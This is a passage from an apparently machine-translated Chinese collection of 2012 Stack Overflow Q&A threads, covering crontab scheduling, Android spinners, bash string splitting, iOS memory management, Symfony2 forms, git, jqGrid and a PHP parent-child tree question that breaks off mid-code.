我有一个可以通过`root`这种方式与用户一起运行的 shell 脚本：

`root@vivid-15:~# ./backup.sh`

它在`/root/backup.sh`。现在，我如何安排它在`crontab`每天上午 01:00 执行？我这样做了：

`0 1 * * * root`

但现在我不知道如何执行命令来做到这一点。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:38:21.357

你试过这个吗？此外，小时字段中的“1”表示凌晨 1 点，而不是下午 1 点。

```
0 1 * * * root /root/backup.sh 
```

编辑：将 13（下午 1 点）改回 1（凌晨 1 点）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T15:44:48.360

crontab 格式：

```
MIN HOUR DAY MON WEEKDAY CMD 
```

我不知道您需要定义您希望它在 crontab 中运行时的用户身份——命令将以使用 crontab -e 创建条目的用户身份运行。要创建以 root 身份运行的 cron 进程，请以 root 身份登录或使用 $ sudo crontab -e 进行设置

我认为您正在寻找更像这样的东西：

```
0 1 * * * /root/backup.sh 
```

# android - 自定义微调器崩溃

> ID：10757294
> 
> 赞同：0
> 
> 时间：2012-05-25T15:34:10.757
> 
> 标签：android, sqlite, spinner

大约一周前，我在这里问了一个关于自定义微调器的问题，并被引导到本指南。[http://app-solut.com/blog/2011/03/using-custom-layouts-for-spinner-or-listview-entries-in-android/](http://app-solut.com/blog/2011/03/using-custom-layouts-for-spinner-or-listview-entries-in-android/)

我遵循了它，并尝试对其进行调整以与我的代码一起使用并将结果从数据库中提取到微调器上，但它一直在崩溃。

这是微调器的代码。

```
public class EditTeam extends Activity {
private final List<SpinnerEntry> spinnerContent = new LinkedList<SpinnerEntry>();
private Spinner D1Spinner;
private final ETSpinnerAdapter D1Adapter = new ETSpinnerAdapter(spinnerContent, this);
DataBaseHelper myDbHelper = new DataBaseHelper(this);

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.editteam);

    myDbHelper = new DataBaseHelper(this);
    myDbHelper.openDataBase();
    fillSpinner();

}

private void fillSpinner() {
    Cursor c = myDbHelper.FetchDrivers();
    startManagingCursor(c);

    // create an array to specify which fields we want to display
    String[] from = new String[]{"FirstName", "LastName"};
    // create an array of the display item we want to bind our data to
    int[] to = new int[]{android.R.id.text1};

    spinnerContent.add(new SpinnerEntry(1, null, "Test"));

    //adapter.setDropDownViewResource( R.layout.spinner_entry_with_icon );

    D1Spinner = (Spinner) findViewById(R.id.spr_Driver1);
    D1Spinner.setAdapter((SpinnerAdapter) D1Adapter);
} 
```

}

我正在使用该联系人示例中的两个类，目前尚未修改。

如您所见，我目前正在尝试仅手动添加一项，但加载时它会崩溃。

这似乎是一个突破点？

> 05-25 15:17:34.773: E/AndroidRuntime(241): java.lang.RuntimeException: 无法启动活动 ComponentInfo{com.f1manager.android/com.f1manager.android.EditTeam}: java.lang.ClassCastException: com .f1manager.android.ETSpinnerAdapter

任何想法都会很棒。

谢谢。

ETSpinnerAdapter 代码（未修改示例中的原始代码）：

```
public class ETSpinnerAdapter {
private final List<SpinnerEntry> content;
private final Activity activity;

public ETSpinnerAdapter(List<SpinnerEntry> content, Activity activity) {
super();
this.content = content;
this.activity = activity;
}

public int getCount() {
return content.size();
}

public SpinnerEntry getItem(int position) {
return content.get(position);
}

public long getItemId(int position) {
return position;
}

public View getView(int position, View convertView, ViewGroup parent) {
final LayoutInflater inflater = activity.getLayoutInflater();
final View spinnerEntry = inflater.inflate(
R.layout.spinner_entry_with_icon, null);    // initialize the layout from xml
final TextView contactName = (TextView) spinnerEntry
        .findViewById(R.id.spinnerEntryContactName);
final ImageView contactImage = (ImageView) spinnerEntry
.findViewById(R.id.spinnerEntryContactPhoto);
final SpinnerEntry currentEntry = content.get(position);
contactName.setText(currentEntry.getContactName());
//contactImage.setImageBitmap(currentEntry.getContactPhoto());
return spinnerEntry;
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:47:20.497

看起来您的 ETSpinnerAdapter 不是 SpinnerAdapter，因为您正在获得一个类强制转换异常。也许您可以发布 ETSpinnerAdapter 的代码？

# ms-access - 依次刷新组合框查询

> ID：10757296
> 
> 赞同：2
> 
> 时间：2012-05-25T15:34:24.077
> 
> 标签：ms-access, combobox

我在一个表单上有两个组合框。一个用于开始日期，一个用于结束日期。选择开始日期后，它会将结束日期限制为大于所选开始日期的日期。这是正确的，但是如何在选择新的开始日期时获取结束日期查询以刷新？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T19:55:06.557

口袋是正确的，尽管添加可能是有益的

```
Me.EndDateBox = Null
Me.EndDateBox.Requery 
```

假设您的查询以某种方式限制了允许的日期。添加“Null”可确保不再存在 WAS 中的任何条目；重新查询有可能使用旧的（不正确的）输入进行正确的查询。这会强制用户在组合框中输入一个新的、隐式正确的值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:39:48.037

我认为您可以在限制值后使用 endDateBox.Requery 。

# string - 需要在一定数量的字符后在 bash 中拆分字符串

> ID：10757300
> 
> 赞同：8
> 
> 时间：2012-05-25T15:34:36.260
> 
> 标签：string, bash, variables

我正在编写一个 bash 脚本，它将执行命令并将值存储在字符串变量中，现在我需要在某些字符之后拆分字符串。有办法吗？我不能使用分隔符，因为格式有点像这样

```
 PV Name /dev/sda2
  PV Size 10.39 GB 
```

在这里，我需要获取 /dev/sda2 和 10.39 GB（如果可能，仅 10.39）并将其写入一个新文件。我不能使用分隔符，因为空间一开始是.. 我没有做太多的 bash 脚本。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-25T15:38:19.097

```
echo "${var:8}" 
```

将回显`$var`从字符 8（从零开始）开始的内容。

剥离从第一个空格开始的任何内容：

```
data=${var:8}
echo "${data%% *}" 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-25T15:40:27.523

要仅获取某些字符，请使用`cut`：

```
 $ echo '1234567' | cut -c2-5
 2345 
```

但是，在您的情况下`awk`看起来更好的选择：

```
$ echo '  PV Size 10.39 GB' | awk '{ print $3 }'
10.39 
```

它将文本读取为空格/制表符分隔的列，因此它应该可以正常工作

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-25T15:42:49.270

你可以使用[`cut`](http://en.wikipedia.org/wiki/Cut_%28Unix%29)：

```
$ echo "PV Name /dev/sda2" |cut -d " " -f 3
/dev/sda2 
```

# javascript - 如何使用 HTTP post 在 ASPX 页面中提交部分或全部控件

> ID：10757304
> 
> 赞同：0
> 
> 时间：2012-05-25T15:35:02.627
> 
> 标签：javascript, asp.net, httpwebrequest, http-post, imageurl

我有一个名为 ShowDesign.aspx 的 aspx 页面，它使用 URL 进行浏览`myurl.com/showdesign.aspx?id=420420`

aspx 页面有许多控件，例如图像、文本按钮、单选按钮等。一些控件是在代码隐藏中创建的，并且大多数控件的值是在代码隐藏中分配/更新的。

当页面准备好显示时，我想在某些控件上使用 HTTP Post（否则对整个页面使用 HTTP post）。我没有这样做，想知道怎么做？我应该添加什么代码，我应该在代码隐藏的哪里添加？

**更新** 想知道下面的 Javascript 会做我想要的吗？我还在检查它。如果有人有任何反馈，请更新。

```
function postToURL(url, values) {
    values = values || {};

    var form = createElement("form", {action: url,
                                      method: "POST",
                                      style: "display: none"});
    for (var property in values) {
        if (values.hasOwnProperty(property)) {
            var value = values[property];
            if (value instanceof Array) {
                for (var i = 0, l = value.length; i < l; i++) {
                    form.appendChild(createElement("input", {type: "hidden",
                                                             name: property,
                                                             value: value[i]}));
                }
            }
            else {
                form.appendChild(createElement("input", {type: "hidden",
                                                         name: property,
                                                         value: value}));
            }
        }
    }
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:15:01.010

我希望这是你要找的：

[http://www.stardeveloper.com/articles/display.html?article=2003061901&page=1](http://www.stardeveloper.com/articles/display.html?article=2003061901&page=1)

# ios - 内存管理何时使用释放

> ID：10757305
> 
> 赞同：0
> 
> 时间：2012-05-25T15:35:03.303
> 
> 标签：ios, memory-management

我对 iOS 3.0+ 中的内存管理有另一个问题，我知道如果我们这样做 [varialbe release] 会将其保留释放到一个对象，但是这样的代码 -

```
- (void) getPostsFromJson:(NSData *)data
{
    NSError *theError = nil;

    NSDictionary *dict = [[CJSONDeserializer deserializer] deserializeAsDictionary:data error:&theError];

    if (dict == nil) {

        [SystemStatusValues getInstance].isValidJson = NO;
        [SystemStatusValues getInstance].httpStatus = HTTP_STATUS_FAILED;

        NSLog(@"getPostsFromJson - %@ %@",
              [theError localizedDescription],
              [[theError userInfo] objectForKey:NSURLErrorFailingURLStringErrorKey]);
    } else {

        NSArray *keys = [dict allKeys];        
        keys = [keys sortedArrayUsingFunction:keySortByInteger context:nil];

        self.keys = keys;
        self.posts = dict;
        NSLog(@"Posts : getPostsFromJson = %@", self.posts);

        if ([keys count] < TOTAL_SECTIONS) {

            [SystemStatusValues getInstance].isValidJson = NO;

        } else {

            [SystemStatusValues getInstance].isValidJson = YES;
            if (self.nextPosts == nil) {

            }

        }

        // [keys release];
        // [dict release];
        return;
    }
} 
```

你可以看到有两个局部变量——keys和dict，我需要在代码末尾调用[keys release]还是[dict release]？实际上我做到了，但它有时会带来粉碎。那么对于局部变量，我们不需要在使用后释放它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:43:27.770

dict 和 keys 都是对自动释放对象的引用。你不应该释放它们，这会导致你的程序终止。`You Don’t Own Objects Returned by Reference and You must not relinquish ownership of an object you do not own`

*那么对于局部变量，我们不需要在使用后释放它吗？*如果您拥有这些对象，则必须在不再需要它们时释放它们，不管它的局部变量还是 ivar。

阅读此 -[高级内存管理编程指南](https://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html#//apple_ref/doc/uid/10000011-SW1)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T15:51:25.100

[这很简单](http://whentouseretaincount.com/)：

> 如果你分配、复制或保留一个对象，你需要释放它。否则你不会。

所以你不需要释放任何一个键或 dict（它们都是自动释放的）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:45:41.933

不要释放`keys`数组。因为`allKeys`方法可能返回自动释放`NSArray`的对象。所以稍后会被系统发布。

似乎`deserializeAsDictionary`还返回一个 autoreleased `NSDictionary`，所以你也不应该释放它。

释放仅使用创建的对象`alloc`。在这种情况下，您使用的是外部方法。您需要遵循这些方法，并查看该对象是否是使用 alloc 创建的。

# php - Symfony2 不同 JQuery UI 选项卡中的多个表单但单页

> ID：10757307
> 
> 赞同：5
> 
> 时间：2012-05-25T15:35:14.040
> 
> 标签：php, javascript, jquery-ui, symfony, twig

我面临一个问题，我可以总结如下：我有一个这样的 TWIG 模板页面（reg.html.twig）：

```
{% extends "::base.html.twig" %}
{% block body %}
<ul class="tabs">
    <li class="left"><a href="#tab1">tab1</a></li>
    <li class="left"><a href="#tab2">tab2</a></li>
    <li class="left"><a href="#tab3">tab3</a></li>
    <li class="right"><a href="#tab4">tab4</a></li>
</ul>
<div class="tabs_container">
    <div id="tab1" class="blocco-tab">
        <form action="{{ path('AAA') }}" method="post" {{ form_enctype(form) }}>
            <div id="name_field">
                {{ form_row(form.name) }}
            </div><!-- /name_field -->
            <div id="address">
                 {{ form_row(form.addresses[0].road) }}
            </div><!-- /address_field -->
        </form>
    </div>
    <div id="tab2" class="blocco-tab">
        <form action="{{ path('BBB') }}" method="post" {{ form_enctype(form) }}>
            <div id="surname_field">
                {{ form_row(form.surname) }}
            </div><!-- /surname_field -->
        </form>
    </div>
</div> <!-- contenitore_tabs -->
{% endblock %} 
```

字段***名称***、***姓氏***和 ***地址***属于示例 Symfony2 实体 Person。 ***地址***是地址集合的第一个也是唯一的元素（出于其他原因，我需要这个作为集合）

工作的 JS 文件是：

```
jQuery(document).ready(function() {
    $(".blocco-tab").hide();
    $("ul.tabs li:first").addClass("active").show();
    $(".blocco-tab:first").show();
    $("ul.tabs li").click(function() {
        $("ul.tabs li").removeClass("active");
        $(this).addClass("active");
        $(".blocco-tab").hide();
        var activeTab = $(this).find("a").attr("href");
        $(activeTab).fadeIn();
        return false;
    });
}); 
```

实体文件：

```
class Person {
    protected $name;
    protected $surname;
    protected $addresses;

    public function __construct(){
        $this->addresses = new ArrayCollection();
    }
} 
```

在 DefaultController 中：

```
public function tab1Action(Request $request){
    $person = new Person();
    $address = new Address();
    $addr_coll = new ArrayCollection();
    $addr_coll->add($address);
    $tab1_type = new Tab1Type();
    $person->setAddresses($addr_coll);
    $form = $this->createForm($tab1_type, $person);
    if ($request->getMethod() == 'POST')
    {
        $form->bindRequest($request);
        if ($form->isValid())
    /*ecc ecc ecc*/
}

public function tab2Action(Request $request){
    $person = new Person();
    $tab2_type = new Tab2Type();
    $form = $this->createForm($tab2_type, $person);
    if ($request->getMethod() == 'POST')
    {
        $form->bindRequest($request);
        if ($form->isValid())
    /*ecc ecc ecc*/
} 
```

实际上，我采取了让每个 FormType 都具有我不需要渲染的所有字段但将“隐藏”和“property_path”=> false 的方式，因为我不能只渲染我想要的字段，因为其他字段会导致错误运行时（它们为空），但我仍然遇到以联合方式处理这两种情况的问题。

将每个表单放在不同的页面（== 不同的路由），使用不同的控制器，一切正常，所以这不是与 symfony 的基本使用相关的问题，而是将 N 个表单与 JQuery UI 集成在一个页面中让我哭。

修复了我必须使用此选项卡，我该如何解决？

1.  我必须做一个动作来处理所有事情吗？
2.  我必须制作一个表格吗？
3.  我错过了什么吗？

在此先感谢，我希望我已经清楚地解释了我的问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T09:09:46.027

您只是将相同的变量用于不同的形式

```
<div id="tab1" class="blocco-tab">
    <form action="{{ path('AAA') }}" method="post" {{ form_enctype(**form1**) }}>
        <div id="name_field">
            {{ form_row(**form1**.name) }}
        </div><!-- /name_field -->
        <div id="address">
             {{ form_row(**form1**.addresses[0].road) }}
        </div><!-- /address_field -->
    </form>
</div>
<div id="tab2" class="blocco-tab">
    <form action="{{ path('BBB') }}" method="post" {{ form_enctype(**form2**) }}>
        <div id="surname_field">
            {{ form_row(**form2**.surname) }}
        </div><!-- /surname_field -->
    </form>
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-01T14:26:15.117

尝试使用单一形式

```
{% extends "::base.html.twig" %}
{% block body %}
<form action="{{ path('AAA') }}" method="post" {{ form_enctype(form) }}>
<ul class="tabs">
    <li class="left"><a href="#tab1">tab1</a></li>
    <li class="left"><a href="#tab2">tab2</a></li>
    <li class="left"><a href="#tab3">tab3</a></li>
    <li class="right"><a href="#tab4">tab4</a></li>
</ul>
<div class="tabs_container">
    <div id="tab1" class="blocco-tab">
            <div id="name_field">
                {{ form_row(form.name) }}
            </div><!-- /name_field -->
            <div id="address">
                 {{ form_row(form.addresses[0].road) }}
            </div><!-- /address_field -->
    </div>
    <div id="tab2" class="blocco-tab">
            <div id="surname_field">
                {{ form_row(form.surname) }}
            </div><!-- /surname_field -->
    </div>
</div> <!-- contenitore_tabs -->
 </form>
{% endblock %} 
```

然后你在 ocontroller`aaaAction()`

```
public function aaaAction(Request $request){
    $person = new Person();
    $address = new Address();
    $addr_coll = new ArrayCollection();
    $addr_coll->add($address);
    $person->setAddresses($addr_coll);
    $form = $this->createForm(new PersonType(), $person);
    if ($request->getMethod() == 'POST')
    {
        $form->bindRequest($request);
        if ($form->isValid())
    /*ecc ecc ecc*/
} 
```

和表单构建器的类

```
class PersonType extends AbstractType {

    public function buildForm(FormBuilder $builder, array $options)
    {
        $builder
                ->add('name', null, array())
                ->add('surname', null, array())
                ->add('addresses', null, array())
        ;
    }

    public function getName()
    {
        return 'person';
    }

    public function getDefaultOptions(array $options)
    {
        return array(
            'data_class' => 'Acme\YourBundle\Entity\Person',
        );
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-04T18:03:23.933

正如我之前提到的，我解决了将所有选项卡包装在一个表单中的问题。您的两个解决方案都可以，谢谢您的时间。

Linuxatico

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T04:28:21.433

万一其他人有这个问题，你可以这样解决（我不确定这是否是最优雅的解决方案，但我认为它比为所有东西制作一个大表格更好）。这个例子混合了 profile 和 changePassword FOSUserBundle 形式：

在您的主节目模板中（在我的情况下为 Profile:show.html.twig）：

```
 {% if profileForm is defined %}
            {% include 'MyBundle:Profile:edit.html.twig' with {'form':profileForm} %}
        {% else %}
            {% render 'MyBundle:Profile:edit' %}
        {% endif %} 
```

重复更改密码：

```
 {% if passwdForm is defined %}
            {% include 'MyBundle:ChangePassword:changePassword.html.twig' with {'form':passwdForm} %}
        {% else %}
            {% render 'FOSUserBundle:ChangePassword:changePassword' %}
        {% endif %} 
```

在您的控制器中（添加其他）：

```
if ($form->isValid()) {
    .....
else {
    return $this->container->get('templating')->renderResponse('FOSUserBundle:Profile:show.html.'.$this->container->getParameter('fos_user.template.engine'),
                     array('user' => $user, 'profileForm' => $form->createView()));
        } 
```

相应地添加 profileForm 和 passwdForm。在我的例子中，修改后的控制器是 ProfileController 和 ChangePasswordControllers（FOSUserBundle 覆盖）。

至于您的标签，如果发现任何错误，您可以添加 javascript（或 twig）来打开标签。

希望这可以帮助 ：）

# mercurial - Google Code 上的 Mercurial 密钥环和密码更改

> ID：10757313
> 
> 赞同：2
> 
> 时间：2012-05-25T15:35:42.867
> 
> 标签：mercurial, google-code, mercurial-keyring, python-keyring

我正在使用 Mercurial（与 THG 捆绑的最新版本）并在 Google Code 上有一个 repo。我启用了`mercurial_keyring`扩展程序，并且在我更改了 Google 帐户的密码之前，它运行良好。现在，由于钥匙串中存储的密码错误，Google Code 返回 HTTP 403 错误，这导致 HG 中止推送，而不再要求输入密码。

有什么方法可以强制更改密钥环上的密码，甚至只是重置它，以便我可以重新输入新密码？管理 python 存储条目的工具`Win32CryptoKeyring`也可以，因为我可以用它来删除我的密码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-09T20:32:31.320

我偶然发现了这个问题。Mercurial_keyring 尝试检测此类情况并重新询问密码，但由于某种原因，这不起作用。

我创建了问题[https://bitbucket.org/Mekk/mercurial_keyring/issue/45/some-way-to-clear-password-and-maybe](https://bitbucket.org/Mekk/mercurial_keyring/issue/45/some-way-to-clear-password-and-maybe)来跟踪问题，欢迎任何希望添加一些信息或关注工作的人跟踪它。

（mercurial_keyring 作者）

# caching - JMeter 缓存和 cookie 管理器发出警告

> ID：10757315
> 
> 赞同：0
> 
> 时间：2012-05-25T15:35:46.727
> 
> 标签：caching, cookies, jmeter, warnings

我在 2.6 jmeter 中有一个奇怪的问题。我有一个非常简单的测试计划，其中包含几个带有线程级别缓存和 cookie 管理器的 http 采样器。每当为 http 采样器启用“使用并发池”时，我都会在日志中看到以下警告：

`jmeter.protocol.http.sampler.HTTPSamplerBase: Existing CacheManager HTTP Cache Manager superseded by HTTP Cache Manager` `jmeter.protocol.http.sampler.HTTPSamplerBase: Existing CookieManager HTTP Cookie Manager superseded by HTTP Cookie Manager`

这会为每个线程重复很多次，并且可能会挂起 jmeter。但是如果“使用并发池”设置被禁用，那么一切都很好。采样器级别没有额外的 cookie 或缓存管理器。在我的测试计划中，我不能没有 Cookie 管理器的功能。

我的测试计划如下所示：
`Test plan`
`---Thread Group`
`------Cookie Manager`
`------Cache Manager`
`------Response assertion`
`------HTTP sampler`
`--------Header Manager`
`------HTTP sampler`
`--------Header Manager`
`------Aggregate report`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:56:04.593

您在范围内有多个 Cookie 和 Cache 管理器，这导致出现此警告。要删除警告，您应该删除额外的无关管理器。

例如。

```
Test Plan
---Thread Group
---HTTP Cookie Manager
-------Sampler
HTTP Cookie Manager 
```

上述设置将导致此警告，因为两个管理器都在采样器的范围内。

这个：

```
Test Plan
---Thread Group
---HTTP Cookie Manager
-------Sampler 
```

不会引起警告，但仍会产生相同的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T04:03:24.697

我发现当启用“使用并发池”的“HTTP 请求默认值”配置元素设置时，我总是收到这些警告。禁用该设置清除警告，不解释为什么？然而。

# powershell - [ADSI]::Exists 抛出异常而不是返回 False

> ID：10757316
> 
> 赞同：5
> 
> 时间：2012-05-25T15:35:54.090
> 
> 标签：powershell, adsi

如果 ADSI 对象尚不存在，我正在尝试使用它创建用户。这是我得到的奇怪结果

```
#Check a user that I know exists
[ADSI]::Exists("WinNT://localhost/micah,user") #True

#Check a group that I know exists
[ADSI]::Exists("WinNT://localhost/administrators,group") #True

#Check a group that DOESN'T exist
[ADSI]::Exists("WinNT://localhost/whoops,group") #False

#Check a user that DOESN'T exist (NOT specifying that the obect is a user)
[ADSI]::Exists("WinNT://localhost/test") #False (This works fine)

#Check a user that DOESN'T exist (specifying that the obect IS a user)
[ADSI]::Exists("WinNT://localhost/test,user") 
#Throws exception "The user name could not be found" 
```

最后一行对我来说毫无意义。为什么当我指定我专门寻找用户时它会抛出异常，但是当我不指定我想要一个用户时它工作得很好？这对我来说似乎完全不直观。我错过了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T17:31:44.537

它是一个错误，微软不会修复它——

[http://connect.microsoft.com/VisualStudio/feedback/details/337682/directoryentry-exists-throws-exception-for-non-existent-winnt-object](http://connect.microsoft.com/VisualStudio/feedback/details/337682/directoryentry-exists-throws-exception-for-non-existent-winnt-object)

> 我们正在解决这个错误，因为不会修复。虽然设计不正确......可能已经编写了应用程序期待这一点 - 并且更改可能会破坏这些应用程序。解决方法是捕获异常 - 不漂亮，同意，但没有足够的理由进行修复。文档需要修复，我将为此打开一个文档工作项。

# ajax - jqgrid 和 ajaxfileupload 的困境

> ID：10757317
> 
> 赞同：1
> 
> 时间：2012-05-25T15:35:57.070
> 
> 标签：ajax, jqgrid

我正在使用 jqgrid 和 ajaxFileUpload.js 脚本来将参数和文件传递给 php 脚本。代码的结构是这样的：

```
 ...  
 url:url_1.php,  
 beforeSubmit: function (postdata,formid)  
   {  
      $.ajaxFileUpload (  
         {  
             url: url_2.php,  
             ...  
             success:  
             error:    
         }), 
      return[true,""];  
   }, 
afterSubmit: function(reponse,postdata)  
   {
      ...  
      return [true,'',''];
   } 
```

我有一个难题：
根据 jqgrid 行为，调用 url_2.php，然后调用 url_1.php。
url_2.php 处理数据（参数+文件），url_1.php 什么也不处理。
url_2.php 可以返回错误或消息（例如“已经存在”），但是错误通过 aftersubmit 事件显示在表单中，并且该事件从 url_1.php 接收错误！
我想我有义务将 ajaxfileupload 放在 beforesubmit 事件中！
有什么想法可以解决这个困境吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T07:39:10.883

您可以改用 jquery 表单插件和 jqGrid dataProxy 方法。

```
 useDataProxy: true,
    dataProxy :  function (opts, act) {  

    opts.iframe = true;
    var $form = $('#FrmGrid_' + $grid.jqGrid('getGridParam', 'id'));
    //Prevent non-file inputs double serialization
    var ele = $form.find('INPUT,TEXTAREA,SELECT').not(':file');
    ele.each(function () {
        $(this).data('name', $(this).attr('name'));
        $(this).removeAttr('name');
    });

    //Send only previously generated data + files
    $form.ajaxSubmit(opts);
    //Set names back after form being submitted
    setTimeout(function () {
        ele.each(function () {
            $(this).attr('name', $(this).data('name'));
        });
    }, 200);
}; 
```

例如[http://jqgrid-php.net](http://jqgrid-php.net)文件 fileUpload 类使用这个。[如果在 jqgrid 中也设置了 editurl，如何在表单编辑中强制 dataProxy 调用中对此进行了](https://stackoverflow.com/questions/10473879/how-to-force-dataproxy-call-in-form-editing-if-editurl-is-set-in-jqgrid)描述。

# git - 如何将我的代码与来自 git 中不同存储库的代码合并

> ID：10757332
> 
> 赞同：1
> 
> 时间：2012-05-25T15:36:47.493
> 
> 标签：git, merge, git-branch

一个月前，我开始在 github 上的一个私有存储库上开发一项新功能。我克隆了存储库并将其分支。从那以后，我一直在分公司工作。

与此同时，代码被移到了 github 上的不同存储库。现在我需要将我所做的与新的发展中的新发展结合起来。

我的点子：

1 - 签出新的存储库。

2 - 找到我的存储库中的最后一个常见提交和新提交。这应该是主分支上的最后一次提交。

3 - 在主分支和我的工作分支之间创建一个补丁。

4 - 将补丁应用到新的存储库。

它是否正确？执行 3 和 4 的 git 命令应该是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:48:30.193

`git-rebase`应该做你想做的事，即将你的改变重播到新的回购：

```
git remote add new-repo /path/to/new-repo
git fetch new-repo
git checkout hacking-branch
git rebase hacking-branch new-repo/master 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:11:33.600

如果新存储库确实是旧存储库的分叉/克隆，那么您应该能够简单地将 URL 替换`.git/config`为新 URL，然后`git fetch`从新项目中提取所有内容。完成后，您可以使用`git rebase`或`git merge`酌情使用。

如果您想跟踪两个项目而不是只跟踪一个项目（旧项目中是否有正在进行的开发，您可能仍想偶尔加入？），那么您可以将新存储库添加为另一个远程 - `git remote add newproj <URL>`。您甚至可以将旧的重命名为其他名称，`origin`以便您可以使用`origin`新存储库的名称。

这将避免需要走补丁路线，因为您实际上只是将本地存储库指向新位置，并且可以直接访问所有新提交以及旧提交。

# c# - 检查输入队列中的消息数

> ID：10757333
> 
> 赞同：1
> 
> 时间：2012-05-25T15:36:48.223
> 
> 标签：c#, .net, msmq, nservicebus

这是否可以使用 NServiceBus 获取 InputQueue 中的消息数量，我是否需要绕过它并使用本机 MSMQ 接口？

* * *

这不会是一个完整的监控，我们有一个包含多个 NSB 组件的系统，并且通过使用 Windows 性能计数器来监控它们。我想要实现的只是一个**简单的健康检查**-> 向组件发送 NSB 消息，它的响应是包含比方说 DB 访问状态和其队列中 MSMQ 消息的数量。这就是为什么我想让它尽可能简单。所以问题是：我可以以简单的方式检查消息号还是我宁愿需要读取性能计数器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-29T10:55:02.327

您必须使用 System.Messaging.MessageQueue.GetAllMessages() 或其枚举器方法之一来获取该信息。NServiceBus 没有公开这一点。

# php - 将一系列父子关系转换成树？

> ID：10757336
> 
> 赞同：2
> 
> 时间：2012-05-25T15:36:58.693
> 
> 标签：php, arrays, recursion, tree

我被卡住了。我想我需要编写一个递归方法，但我不知道如何......！

我正在尝试将一组父子关系转换为层次树，稍后我将向用户显示该树。

这是我可能拥有的输入数据的示例：

```
$input = array(
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 2
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 3
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 4
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 212
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 339
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 336
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 6
        ),
    array(
            'itemGroupID' => 1,
            'childItemGroupID' => 5
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 8
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 9
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 10
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 11
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 12
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 13
        ),
    array(
            'itemGroupID' => 6,
            'childItemGroupID' => 74
        ),
    array(
            'itemGroupID' => 9,
            'childItemGroupID' => 15
        ),
    array(
            'itemGroupID' => 10,
            'childItemGroupID' => 16
        ),
    array(
            'itemGroupID' => 11,
            'childItemGroupID' => 17
        ),
    array(
            'itemGroupID' => 12,
            'childItemGroupID' => 18
        ),
    array(
            'itemGroupID' => 13,
            'childItemGroupID' => 19
        ),
    array(
            'itemGroupID' => 74,
            'childItemGroupID' => 75
        )
 ); 
```

我希望以如下格式取回数据：

```
$output = array(
    array(
        'itemGroupID' => 1,
        'children' => array(
              array(
                  'itemGroupID' => 2                   
              ),
              array(
                  'itemGroupID' => 3                   
              ),
              array(
                  'itemGroupID' => 4                   
              ),
              array(
                  'itemGroupID' => 212                   
              ),
              array(
                  'itemGroupID' => 339                   
              ),
              array(
                  'itemGroupID' => 336                  
              ),
              array(
                  'itemGroupID' => 6,
                  'children' => array(
                      array(
                          'itemGroupID' => 8                  
                      ),
                      array(
                          'itemGroupID' => 9,
                          'children' => array(
                              array(
                                  'itemGroupID' => 15
                              )   
                          )                 
                      ), 
                      array(
                          'itemGroupID' => 10,
                          'children' => array(
                              array(
                                  'itemGroupID' => 16
                              )   
                          )                  
                      ), 
                      array(
                          'itemGroupID' => 11,
                          'children' => array(
                              array(
                                  'itemGroupID' => 17
                              )   
                          )                   
                      ), 
                      array(
                          'itemGroupID' => 12,
                          'children' => array(
                              array(
                                  'itemGroupID' => 18
                              )   
                          )                   
                      ), 
                      array(
                          'itemGroupID' => 13,
                          'children' => array(
                              array(
                                  'itemGroupID' => 19
                              )   
                          )                   
                      ), 
                      array(
                          'itemGroupID' => 74,
                          'children' => array(
                              array(
                                  'itemGroupID' => 75
                              )   
                          )                   
                      )                    
                  )               
              ),
              array(
                  'itemGroupID' => 5                   
              )
         )
    )
); 
```

我设法编写了一些代码来告诉我从哪里开始。（因为我担心如果你从第一个节点递归它可能会证明这已经是从链的中途开始了......）

顺便说一句，我输出的元素可用于获取每个层次链的起始索引。

```
private function _arraySearch($arr, $callback)
{
    foreach ($arr as $key => $item) {
        if ($callback($item)) {
            return $key;
        }
    }
    return false;
}

private function _findRootsOfItemGroupTree($activeItemGroupChildren)
{
